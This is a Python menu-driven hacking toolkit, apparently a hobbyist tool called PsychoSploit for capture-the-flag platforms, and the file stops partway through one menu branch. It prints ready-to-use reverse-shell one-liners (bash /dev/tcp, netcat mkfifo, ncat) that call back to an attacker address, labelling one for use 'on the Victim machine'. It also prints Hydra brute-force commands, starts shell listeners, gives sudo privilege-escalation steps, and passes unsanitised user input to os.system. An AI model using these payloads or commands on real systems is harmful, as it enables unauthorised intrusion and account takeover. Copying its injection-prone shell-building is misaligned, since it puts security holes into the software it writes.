import os
import time
import sys
import threading
import itertools
import colorama

from colorama import init, Fore, Back, Style

# starts colorama
init(autoreset=True)

print(Style.BRIGHT + Fore.RED + '__________                    .__            _________      .__         .__  __   ')
print(Style.BRIGHT + Fore.RED + '\______   \_________.__. ____ |  |__   ____ /   _____/_____ |  |   ____ |__|/  |_ ')
print(Style.BRIGHT + Fore.RED + ' |     ___/  ___<   |  |/ ___\|  |  \ /  _ \\_____  \\____ \|  |  /  _ \|  \   __\ ')
print(Style.BRIGHT + Fore.RED + ' |    |   \___ \ \___  \  \___|   Y  (  <_> )        \  |_> >  |_(  <_> )  ||  |  ')
print(Style.BRIGHT + Fore.RED+  ' |____|  /____  >/ ____|\___  >___|  /\____/_______  /   __/|____/\____/|__||__|  ')
print(Style.BRIGHT + Fore.RED + '              \/ \/         \/     \/              \/|__|                         ')
print("\n")
print('Starting Up PsychoSploit....')
done = False
#here is the animation
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rLOADING... ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r[+]H4CK TH3 W0RLD     ')

t = threading.Thread(target=animate)
t.start()

#long process here or Time Process to extend the wairt just edit the time.sleep(10) variable to what ever number that you want
time.sleep(3)
done = True
print('\n')
print(Style.BRIGHT + Fore.RED +' __________             ___________.__           __      __            .__       .___')
print(Style.BRIGHT + Fore.RED +' \______   \__  _  _____\__    ___/|  |__   ____/  \    /  \___________|  |    __| _/')
print(Style.BRIGHT + Fore.RED +'  |     ___/\ \/ \/ /    \|    |   |  |  \_/ __ \   \/\/   /  _ \_  __ \  |   / __ | ')
print(Style.BRIGHT + Fore.RED +'  |    |     \     /   |  \    |   |   Y  \  ___/\        (  <_> )  | \/  |__/ /_/ | ')
print(Style.BRIGHT + Fore.RED +'  |____|      \/\_/|___|  /____|   |___|  /\___  >\__/\  / \____/|__|  |____/\____ | ')
print(Style.BRIGHT + Fore.RED +'                        \/              \/     \/      \/                         \/ ')
print('\n')
print('\n')

print(Style.BRIGHT + Fore.CYAN +'[1] Check If Host Is Up')
print(Style.BRIGHT + Fore.CYAN +'[2] Nmap Agressive Scan Command')
print(Style.BRIGHT + Fore.CYAN +'[3] Nmap Basic Vulnurability Scan')
print(Style.BRIGHT + Fore.CYAN +'[4] Nmap Vulnurability Scan With Verbose And More results (Reccomended)')
print(Style.BRIGHT + Fore.CYAN +'[5] HTTP Hydra Brute Force Command')
print(Style.BRIGHT + Fore.CYAN +'[6] FTP Hydra Bruteforce Command')
print(Style.BRIGHT + Fore.CYAN +'[7] SSH Hydra Brute Force Command')
print(Style.BRIGHT + Fore.CYAN +'[8] HTTPS Hydra Brute Force Command')
print(Style.BRIGHT + Fore.CYAN +'[9] My Github :3')
print(Style.BRIGHT + Fore.CYAN +'[10] Download rockyou.txt (This Will Download To your /Documents/ Directory)')
print(Style.BRIGHT + Fore.CYAN + '[11] Reverse Shell Cheet Sheet')
print(Style.BRIGHT + Fore.CYAN + '[12] Buy Me A Coffee')

time.sleep(1)
print('\n')
main = input(Style.BRIGHT + Fore.YELLOW + 'PWNED: ')

if main == '1':
    print('ping <HOST>')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '2':
    print('nmap -A <HOST>')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '3':
    print('nmap -sC -sV --script vuln <HOST>')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '4':
    print('nmap -vv -sV --script vuln <HOST>')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '5':
    print('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt <HOST> http-post-form "/website/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"')
    print('MAKE SURE TO CHANGE THE PATH TO YOUR WORDLIST! IF YOUR ON KALI LINUX YOU DONT NEED TO CHANGE THE PATH TO YOUR ROCKYOU.TXT \n WORDLIST BECAUSE IT IS IN THAT DIRECTORY BY DEFAULT; IF YOU DO NOT HAVE THE ROCKYOU.TXT THEN YOU CAN RESTART THE SCRIPT AND DOWNLOAD IT \n THAT DOWNLOAD FOR THE ROCKYOU.TXT WILL BE DOWNLOADED IN YOUR /home/Documents DIRECTORY')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '9':
    os.system('firefox https://github.com/MalwareMix')
    os.system('firefox-esr https://github.com/MalwareMix')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '10':
    os.mkdir('/opt/wordlist')
    time.sleep(1)
    print('[+] Preparing The Download....')
    time.sleep(5)
    os.system('curl https://gitlab.com/kalilinux/packages/wordlists/-/raw/kali/master/rockyou.txt.gz?inline=false -o rockyou.txt.gz > /opt/wordlist/')
    time.sleep(3)
    print('[*] Download Complete!')
    os.system('python3 PsychoSploit.py')
elif main == '6':
    print('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt ftp://IP')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '12':
    os.system('firefox https://www.buymeacoffee.com/PsychoCoder')
    time.sleep(3)
    os.system('python3 PsychoSploit.py')
elif main == '7':
    print('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt ssh://IP')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '8':
    print('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt <HOST> https-post-form "/website/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"')
elif main == '11':
    time.sleep(2)
    print('Getting The Reverse Shells Warmed UP :3......')
    time.sleep(2)
    os.system('clear')
    os.system('mkdir ~/Desktop/temp')
    print(Style.BRIGHT + Fore.CYAN +'__________                                         _________.__           .__  .__          ')
    print(Style.BRIGHT + Fore.CYAN +'\______   \ _______  __ ___________  ______ ____  /   _____/|  |__   ____ |  | |  |   ______')
    print(Style.BRIGHT + Fore.CYAN +' |       _// __ \  \/ // __ \_  __ \/  ___// __ \ \_____  \ |  |  \_/ __ \|  | |  |  /  ___/')
    print(Style.BRIGHT + Fore.CYAN +' |    |   \  ___/\   /\  ___/|  | \/\___ \\  ___/ /        \|   Y  \  ___/|  |_|  |__\___ \ ')
    print(Style.BRIGHT + Fore.CYAN +' |____|_  /\___  >\_/  \___  >__|  /____  >\___  >_______  /|___|  /\___  >____/____/____  >')
    print(Style.BRIGHT + Fore.CYAN +'        \/     \/          \/           \/     \/        \/      \/     \/               \/ ')
    print('\n')
    print("\n")

    print(Style.BRIGHT + Fore.RED + '[1] Bash -i')
    print(Style.BRIGHT + Fore.RED +'[2] Bash 196')
    print(Style.BRIGHT + Fore.RED +'[3] Bash 5')
    print(Style.BRIGHT + Fore.RED +'[4] nc mkfifo')
    print(Style.BRIGHT + Fore.RED +'[5] nc -e')
    print(Style.BRIGHT + Fore.RED +'[6] nc -c')
    print(Style.BRIGHT + Fore.RED +'[7] ncat UDP')
    print(Style.BRIGHT + Fore.RED +'[8] C')
    print(Style.BRIGHT + Fore.RED +'[9] C#')
    print(Style.BRIGHT + Fore.RED +'[10] Perl')
    print(Style.BRIGHT + Fore.RED +'[11] PHP Emoji')
    print(Style.BRIGHT + Fore.RED +'[12] Reverse Pentestmonkey PHP')
    print(Style.BRIGHT + Fore.RED +'[13] PHP')
    print(Style.BRIGHT + Fore.RED +'[14] Powershell 1')
    print(Style.BRIGHT + Fore.RED +'[15] Powershell 2')
    print(Style.BRIGHT + Fore.RED +'[15] Powershell 3')
    print(Style.BRIGHT + Fore.RED +'[16]Powershell Base64')
    print(Style.BRIGHT + Fore.RED +'[17] Python 1')
    print(Style.BRIGHT + Fore.RED +'[18] Python 2')
    print(Style.BRIGHT + Fore.RED +'[19] Python 3')
    print(Style.BRIGHT + Fore.RED +'[20] node.js')
    print(Style.BRIGHT + Fore.RED +'[21] Java')
    print(Style.BRIGHT + Fore.RED +'[22] telnet')
    print(Style.BRIGHT + Fore.RED +'[23]zsh')
    print(Style.BRIGHT + Fore.MAGENTA +'[24] Listerns')

time.sleep(1)
print('\n')
pwn = input(Style.BRIGHT + Fore.YELLOW + 'PWNED: ')

if pwn == '1':
    print(Style.BRIGHT + Fore.CYAN + 'sh -i >& /dev/tcp/10.10.10.10/4444 0>&1')
    time.sleep(5)
    os.system('python3 APsychoSploit.py')
elif pwn == '2':
    print(Style.BRIGHT + Fore.CYAN + '0<&196;exec 196<>/dev/tcp/10.10.10.10/4444; sh <&196 >&196 2>&196')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '3':
    print(Style.BRIGHT + Fore.CYAN + 'sh -i 5<> /dev/tcp/10.10.10.10/4444 0<&5 1>&5 2>&5')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '4':
    print(Style.BRIGHT + Fore.CYAN + 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '5':
    print(Style.BRIGHT + Fore.CYAN + 'nc -e sh 10.10.10.10 4444')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '6':
    print(Style.BRIGHT + Fore.CYAN + 'nc -c sh 10.10.10.10 4444')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '7':
    print(Style.BRIGHT + Fore.CYAN + 'ncat 10.10.10.10 4444 -e sh')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '8':
    print(Style.BRIGHT + Fore.CYAN + 'This Will Make A Folder In the /Desktop/temp called tmp Will Be the OutPut Of Both "C" Reverse Shells in TxT Form')
    time.sleep(3)
    print(Style.BRIGHT + Fore.CYAN + 'Getting Things SetUp!......')
    time.sleep(3)
    os.system('cp ~/PsychoSploit/src/c.txt ~/Desktop/temp/')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '9':
    time.sleep(3)
    print(Style.BRIGHT + Fore.CYAN + 'Getting File Ready!.....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/C#.txt ~/Desktop/temp/')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '10':
    os.system('cp ~/PsychoSploit/src/Perl.txt ~/Desktop/temp/')
    print(Style.BRIGHT + Fore.CYAN + 'Perl Reverse Shell Is In /Desktop/tmp/ !')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '11':
    time.sleep(3)
    print(Style.BRIGHT + Fore.CYAN + 'Getting Things SetUp!......')
    time.sleep(3)
    os.system('cp ~/PsychoSploit/src/PHP_Emoji.php ~/Desktop/temp')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '12':
    print('Getting The File For You (REMEMBER THIS WILL OUTPUT TO /Desktop/tmp) !!!! AND RUN THIS SCRIPT AS ROOT!!!.....')
    time.sleep(3)
    os.system('cp ~/PsychoSploit/src/PentestMonkeyReverse.php ~/Desktop/temp/')
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '13':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/PHP.txt ~/Desktop/temp/')
    time.sleep(1)
    print('Done!')
    os.system('python3 PsychoSploit.py')
elif pwn == '14':
    print('Getting File Ready For You will be OutPuted In Your ~/Desktop/temp....')
    time.sleep(3)
    os.system('cp ~/PsychoSploit/src/PS1.txt ~/Desktop/temp/')
    time.sleep(1)
    print('Done!')
    os.system('python3 PsychoSploit.py')
elif pwn == '15':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/PS2.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '16':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/PS3.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '17':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/python1.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '18':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/python2.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '19':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/python3.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '20':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/node.js ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '21':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/java.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '23':
    print('Getting File Ready For You will be OutPuted In Your ~/Desktop/temp/....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/zsh.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '22':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/telnet.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '24':
    time.sleep(2)
    print('Getting The Listeners Warmed UP :3......')
    time.sleep(2)
    os.system('clear')

print(Style.BRIGHT + Fore.RED + ' ____     __          __                                     ')
print(Style.BRIGHT + Fore.RED +  '|    |   |__| _______/  |_  ____   ____   ___________  ______')
print(Style.BRIGHT + Fore.RED +  '|    |   |  |/  ___/\   __\/ __ \ /    \_/ __ \_  __ \/  ___/')
print(Style.BRIGHT + Fore.RED +  '|    |___|  |\___ \  |  | \  ___/|   |  \  ___/|  | \/\___ ')
print(Style.BRIGHT + Fore.RED +  '|_______ \__/____  > |__|  \___  >___|  /\___  >__|  /____  >')
print(Style.BRIGHT + Fore.RED +  '        \/       \/            \/     \/     \/           \/')
print('\n')
print('\n')

print(Style.BRIGHT + Fore.MAGENTA + '[1] How To Install PwnCat And Use')
print(Style.BRIGHT + Fore.MAGENTA + '[2] How To Use Netcat')
print(Style.BRIGHT + Fore.MAGENTA + '[3] Start A Listen (NetCat)')
print(Style.BRIGHT + Fore.MAGENTA + '[4] What Is A Listener')
print(Style.BRIGHT + Fore.MAGENTA + '[5] How To Stableize A Reverse Shell')
print(Style.BRIGHT + Fore.MAGENTA + '[6] Stablize Your Shell (Instruction Guid)')
print(Style.BRIGHT + Fore.MAGENTA + '[7] Start A PwnCat Listener')
print(Style.BRIGHT + Fore.MAGENTA + '[8] Start A Socat Listener')
print(Style.BRIGHT + Fore.LIGHTGREEN_EX + '[9] PrivEsc')

time.sleep(1)
print('\n')
listen = input(Style.BRIGHT + Fore.YELLOW + 'PWNED: ')

if listen == '1':
    os.system('firefox https://pwncat.readthedocs.io/en/latest/installation.html')
    time.sleep(3)
    os.system('python3 PsychoSploit.py')
elif listen == '2':
    os.system('firefox https://www.irongeek.com/i.php?page=backtrack-3-man/netcat')
    time.sleep(3)
    os.system('python3 PsychoSploit.py')
elif listen == '4':
    print(Style.BRIGHT + Fore.MAGENTA + 'A Listener is a tool which is used in pentests. NC or Netcat is know as the pentesters swissarmy knife due to the fact that \n it does not just serve as a listener but you can also use it to check if certian ports open ports are open or operational in a network or client! \n A listener is used to catch a open connection that is made via a reverse shell or backdoor. You can read more about Listeners with the following link ------> https://www.hackers-arise.com/hacking-fundamentals')
    os.system('python3 PsychoSploit.py')
elif listen == '5':
    print('So you have gotten a shell that may look like this "$" or just looks like a blank terminal command line that is what you call A unstable Shell! There are many ways to stabalize your reverse shell! \n one of the basic ways to stabilize your reverse shell is stabilizing it with python! TO get the python command inorder to stabalize your shell re-launch the script and choose option 6 which will make A .txt document with instructions to stabalize your shell!!!')
    time.sleep(3)
    os.system('python3 PsychoSploit.py')
elif listen == '6':
    time.sleep(3)
    os.system('cp ~/PsychoSploit/src/stable.txt ~/Desktop/temp/')
    time.sleep(3)
    print('Done! Go check your /Desktop/temp Folder!')
    time.sleep(3)
    os.system('python3 PsychoSploit.py')
elif listen == '7':
    print('Starting The PwnCat Listener...')
    time.sleep(3)
    print(Style.BRIGHT + Fore.MAGENTA + 'Listener Is Active Using pwncat -l -p 1234')
    print('H4PPY H4CK3ING; You Can Use The payload sh -i >& /dev/tcp/YOUR_IP/4444 0>&1 on the Victim machine to get the reverse Shell!')
    os.system('pwncat -l -p 1234')
elif listen == '3':
    print('Starting The NetCat Listener...')
    time.sleep(3)
    print(Style.BRIGHT + Fore.MAGENTA + 'Listener Is Active Using nc -lnvp 1234')
    print('H4PPY H4CK3ING; You Can Use The payload sh -i >& /dev/tcp/YOUR_IP/4444 0>&1 on the Victim machine to get the reverse Shell!')
    os.system('nc -lnvp 1234')
elif listen == '8':
    time.sleep(3)
    print('Starting The Socat Listener...')
    time.sleep(3)
    print('H4PPY H4CK3ING; You Can Use The payload sh -i >& /dev/tcp/YOUR_IP/4444 0>&1 on the Victim machine to get the reverse Shell!')
    os.system("socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash")

elif listen == '9':
    time.sleep(3)
    os.system('mkdir ~/PsychoSploit/PrivEsc')
    time.sleep(2)
    print("\n")
print('[*] Getting The PrivEsc Helpers Warmed Up...')
done = False
#here is the animation
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rLOADING... ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r[+]R00T TH03S SYST3MS!     ')

t = threading.Thread(target=animate)
t.start()

#long process here or Time Process to extend the wairt just edit the time.sleep(10) variable to what ever number that you want
time.sleep(3)
done = True
print('\n')
time.sleep(2)
os.system('clear')
print(Style.BRIGHT + Fore.LIGHTGREEN_EX + '__________        .__      ___________              ')
print(Style.BRIGHT + Fore.LIGHTGREEN_EX + '\______   \_______|__|__  _\_   _____/  ______  ____  ')
print(Style.BRIGHT + Fore.LIGHTGREEN_EX + ' |     ___/\_  __ \  \  \/ /|    __)_  /  ___/ / ___\ ')
print(Style.BRIGHT + Fore.LIGHTGREEN_EX + ' |    |     |  | \/  |\   / |        \ \___ \ \  \___ ')
print(Style.BRIGHT + Fore.LIGHTGREEN_EX + ' |____|     |__|  |__| \_/ /_______  /____  > \___  >')
print(Style.BRIGHT + Fore.LIGHTGREEN_EX + '                                   \/     \/     \/ ')
print('\n')
print('\n')

print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[1] What Is PrivEsc')
print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + "[2] How To PrivEsc (Exploit What A User In A Linux Machine's Sudo Is)")
print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[3] How To PrivEsc (Crontab)')
print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[4] How To PrivEsc (Kernal Exploits)')
print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[5] How To Look For Special Files Or Ways To PrivEsc (Linpeas)')
print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[6] Download PrivEsc Tools (Will Install Linpeas and LinEnum)')
print(Style.BRIGHT + Back.RED +Fore.LIGHTGREEN_EX + '[7] AutoMation')

time.sleep(1)
print('\n')
privesc = input(Style.BRIGHT + Fore.YELLOW + 'PWNED: ')

if privesc == '6':
    time.sleep(3)
    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'Getting Linpeas and LinEnum Downloaded Once Downloaded They Will Be Locaed In Your ~/PsychoSploit/PrivEsc/ Directory!...')
    time.sleep(2)
    os.system('git clone https://github.com/rebootuser/LinEnum.git && mv LinEnum/ ~/PsychoSploit/PrivEsc/')
    os.system('git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git && mv privilege-escalation-awesome-scripts-suite/ ~/PsychoSploit/PrivEsc/')
    time.sleep(2)
    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'Done! Both Linpeas and LinEnum Are Now Located In Your ~/PsychoSploit/PrivEsc/ Directory!')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif privesc == '2':
    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'There are many ways to obtain Root in a system one way is to exploit their "sudo" ussage. For Example i have a linux Machine and i have 2 users and 2 users only \n one user is Dave and the other is Root (Administrator). Now the User Dave is able to run "Git" as root useing sudo. They are able to run "Git" as Administrator! but how to we Exploit the User Dave sudo? There are many ways to obtain root from git \n one way is to to the following command "sudo git -p help config" and then type "!/bin/sh" To obtain root (Administrator) Of the machine! \n Now that might be one way but there are many other ways to get root from a users sudo. but one main question is How do we know what the users sudo is? \n well what is easy we can easily check that via the command "sudo -l" This wil show you what the user is able to run as sudo! Here is a blog talking about privesc via sudo \n PrivEsc Via A Users Sudo https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d \n GTFOBINS https://gtfobins.github.io/ \n What is gtfo bins? gtfobins is a website that shows you many ways to PrivEsc Via a linux users Sudo!')
    time.sleep(10)
    os.system('python3 PsychoSploit.py')
elif privesc == '1':
    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'What is PrivEsc? To privesc is to upgrade your user to system administrator!')
    time.sleep(3)
    os.system('python3 PsychoSploit.py')
elif privesc == '3':
    time.sleep(3)
    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'BE AWARE THAT IN A FEW SECONDS 3 PAGES SHOWING YOU HOW TO PRIVESC VIA CRONTABS WILL POP UP IN 3 SECONDS!')
    time.sleep(3)
    os.system('firefox https://medium.com/swlh/privilege-escalation-via-cron-812a9da9cf1a')
    os.system('firefox https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/')
    os.system('firefox https://drigbypentest.com/2020/11/13/linux-privesc-3-cronjobs/')
    time.sleep(3)
    os.system('python3 PsychoSploit.py')
elif privesc == '4':
    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'now first question is how do we check the kernal of the linux machine? well first we do the simple command "uname -r" This will show us the kernal version of the linux machine and what we can do to easily find a exploit for it is \n copy the kernal version and type "<linux_kernal_version> exploit-db or exploits! here is a link to a Stack Exchange article on how to detect kernal exploits ------> https://security.stackexchange.com/questions/174877/how-can-you-detect-kernel-exploits"')
    time.sleep(10)
    os.system('python3 PsychoSploit.py')
elif privesc == '5':
    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'How To Look For Special Files Or Ways To PrivEsc (Linpeas)! ok so inorder for us to get this setup i have made a "How_to_use_linpeas.txt" This will be created and moved to your u guessed it your /Desktop/temp/ folder in there it will show you how to use linpeas and its manual! \n the file will appear in approximatly 3 seconds!')
    time.sleep(3)
    os.system('cp ~/PsychoSploit/src/How_to_use_linpeas.txt ~/Desktop/temp/')
    time.sleep(2)
    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'Done! Check your /Desktop/temp/ !!')
elif privesc == '7':
    time.sleep(3)
    os.system('mkdir ~/PsychoSploit/Nmap')
    time.sleep(2)
    print("\n")
print('[*] Getting The Automated Robots Warmed Up...')
done = False
#here is the animation
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rLOADING... ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r[+]PW3N TH03S SYST3MS!     ')

t = threading.Thread(target=animate)
t.start()

#long process here or Time Process to extend the wairt just edit the time.sleep(10) variable to what ever number that you want
time.sleep(5)
done = True
print('\n')
time.sleep(2)
os.system('clear')

print(Style.BRIGHT + Back.RED +Fore.LIGHTGREEN_EX + '                                                                           .         .                                                                                          ')
print(Style.BRIGHT + Back.RED +Fore.LIGHTGREEN_EX + '         .8.       8 8888      88 8888888 8888888888 ,o888888o.           ,8.       ,8.                   .8.    8888888 8888888888  8 8888     ,o888888o.     b.             8 ')
print(Style.BRIGHT + Back.RED +Fore.LIGHTGREEN_EX + '        .888.      8 8888      88       8 8888    . 8888     `88.        ,888.     ,888.                 .888.         8 8888        8 8888  . 8888     `88.   888o.          8 ')
print(Style.BRIGHT + Back.RED +Fore.LIGHTGREEN_EX + '       :88888.     8 8888      88       8 8888   ,8 8888       `8b      .`8888.   .`8888.               :88888.        8 8888        8 8888 ,8 8888       `8b  Y88888o.       8 ')
print(Style.BRIGHT + Back.RED +Fore.LIGHTGREEN_EX + '      . `88888.    8 8888      88       8 8888   88 8888        `8b    ,8.`8888. ,8.`8888.             . `88888.       8 8888        8 8888 88 8888        `8b .`Y888888o.    8 ')
print(Style.BRIGHT + Back.RED +Fore.LIGHTGREEN_EX + "     .8. `88888.   8 8888      88       8 8888   88 8888         88   ,8'8.`8888,8^8.`8888.           .8. `88888.      8 8888        8 8888 88 8888         88 8o. `Y888888o. 8 ")
print(Style.BRIGHT + Back.RED +Fore.LIGHTGREEN_EX + "    .8`8. `88888.  8 8888      88       8 8888   88 8888         88  ,8' `8.`8888' `8.`8888.         .8`8. `88888.     8 8888        8 8888 88 8888         88 8`Y8o. `Y88888o8 ")
print(Style.BRIGHT + Back.RED +Fore.LIGHTGREEN_EX + "   .8' `8. `88888. 8 8888      88       8 8888   88 8888        ,8P ,8'   `8.`88'   `8.`8888.       .8' `8. `88888.    8 8888        8 8888 88 8888        ,8P 8   `Y8o. `Y8888 ")
print(Style.BRIGHT + Back.RED +Fore.LIGHTGREEN_EX + "  .8'   `8. `88888.` 8888     ,8P       8 8888   `8 8888       ,8P ,8'     `8.`'     `8.`8888.     .8'   `8. `88888.   8 8888        8 8888 `8 8888       ,8P  8      `Y8o. `Y8 ")
print(Style.BRIGHT + Back.RED +Fore.LIGHTGREEN_EX + " .888888888. `88888. 8888   ,d8P        8 8888    ` 8888     ,88' ,8'       `8        `8.`8888.   .888888888. `88888.  8 8888        8 8888  ` 8888     ,88'   8         `Y8o.` ")
print(Style.BRIGHT + Back.RED +Fore.LIGHTGREEN_EX + ".8'       `8. `88888. `Y88888P'         8 8888       `8888888P'  ,8'         `         `8.`8888. .8'       `8. `88888. 8 8888        8 8888     `8888888P'     8            `Yo ")
print('\n')
print('\n')

print(Style.BRIGHT + Fore.LIGHTRED_EX + '[1] Nmap Agressive Scan (Automated)')
print(Style.BRIGHT + Fore.LIGHTRED_EX + '[2] Hydra FTP BruteForce')
print(Style.BRIGHT + Fore.LIGHTRED_EX + '[3] Hydra FTP BruteForce')
print(Style.BRIGHT + Fore.LIGHTRED_EX + '[4] Gobuster Dir BruteForce')
print(Style.BRIGHT + Fore.LIGHTRED_EX + '[5] Hydra HTTP BruteForce')
print(Style.BRIGHT + Fore.LIGHTRED_EX + '[6] Nmap Vulnurability Scan (Verbose and Extra)')
print(Style.BRIGHT + Fore.LIGHTRED_EX + '[7] Check Your VPN Adress (For TryHackMe or HackTheBox)')

time.sleep(1)
print('\n')
automate = input(Style.BRIGHT + Fore.YELLOW + 'PWNED: ')

if automate == '1':
    time.sleep(3)
    print('Getting Nmap Ready...')
    time.sleep(3)
    print(Style.BRIGHT + Fore.RED + 'Enter IP')
    IP = input(Style.BRIGHT + Fore.RED + 'IP: ')
    time.sleep(2)
    print('Starting The Scan Once Done All Of The Information Will Be OutPuted Into A .txt File Called nmap.log Located In Your ~/PsychoSploit/Nmap/ Directory!')
    time.sleep(2)
    os.system('nmap -A ' + IP + ' | tee nmap.log > ~/PsychoSploit/Nmap/')
    time.sleep(3)
    os.system('python3 PsychoSploit.py')

elif automate == '2':
    time.sleep(3)
    print(Style.BRIGHT + Fore.RED + 'Getting Hydra Ready...')
    time.sleep(3)
    print(Style.BRIGHT + Fore.RED + 'Enter The Path To Your Wordlst (rockyou.txt)')
    WORDLIST = input(Style.BRIGHT + Fore.YELLOW + 'Wordlist: ')
    time.sleep(3)
    print(Style.BRIGHT + Fore.RED + 'Enter IP')
    IP = input(Style.BRIGHT + Fore.YELLOW + 'IP: ')
    time.sleep(2)
    print(Style.BRIGHT + Fore.RED + 'Starting The BruteForce...')
    time.sleep(2)
    os.system('hydra -L ' + WORDLIST + ' -P ' + WORDLIST + ' ftp://' + IP + ' -t 64')

elif automate == '3':
    time.sleep(3)
    print(Style.BRIGHT + Fore.RED + 'Getting Hydra Ready...')
    time.sleep(3)
    print(Style.BRIGHT + Fore.RED + 'Enter The Path To Your Wordlst (rockyou.txt)')
    WORDLIST = input(Style.BRIGHT + Fore.YELLOW + 'Wordlist: ')
    time.sleep(3)
    print(Style.BRIGHT + Fore.RED + 'Enter IP')
    IP = input(Style.BRIGHT + Fore.YELLOW + 'IP: ')
    time.sleep(2)
    print(Style.BRIGHT + Fore.RED + 'Starting The BruteForce...')
    time.sleep(2)
    os.system('hydra -L ' + WORDLIST + ' -P ' + WORDLIST + ' ssh://' + IP + ' -t 64')

elif automate == '4':
    time.sleep(3)
    print('Getting Gobuster Ready...')
    time.sleep(3)
